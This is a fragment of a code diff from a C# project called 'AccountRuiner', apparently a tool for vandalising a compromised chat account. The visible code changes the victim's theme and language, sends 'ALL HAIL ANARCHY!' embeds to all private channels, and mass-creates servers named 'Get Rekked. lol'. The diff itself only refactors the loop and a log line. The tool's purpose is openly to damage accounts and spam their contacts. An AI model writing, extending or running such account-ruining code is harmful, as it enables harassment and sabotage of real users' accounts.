@@ -48,11 +48,10 @@ namespace AccountRuiner
             client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
             client.User.ChangeSettings(new UserSettings() { Language = Language.Russian });
 
-            foreach (var dm in client.GetPrivateChannels())
+            foreach (var dm in args.PrivateChannels)
             {
                 try
                 {
-                    dm.TriggerTyping();
                     EmbedMaker embed = new EmbedMaker
                     {
                         Title = "ALL HAIL ANARCHY!",
@@ -119,7 +118,7 @@ namespace AccountRuiner
             for (int i = 1; i <= guilds; i++)
             {
                 client.CreateGuild("Get Rekked. lol", Image.FromFile("face.png"), "russia");
-                Console.WriteLine("Made {0} Guilds...", i);
+                Console.WriteLine($"Made {i} Guilds...");
             }
             Console.WriteLine("DONE! You Can Now Close The Program");
         }
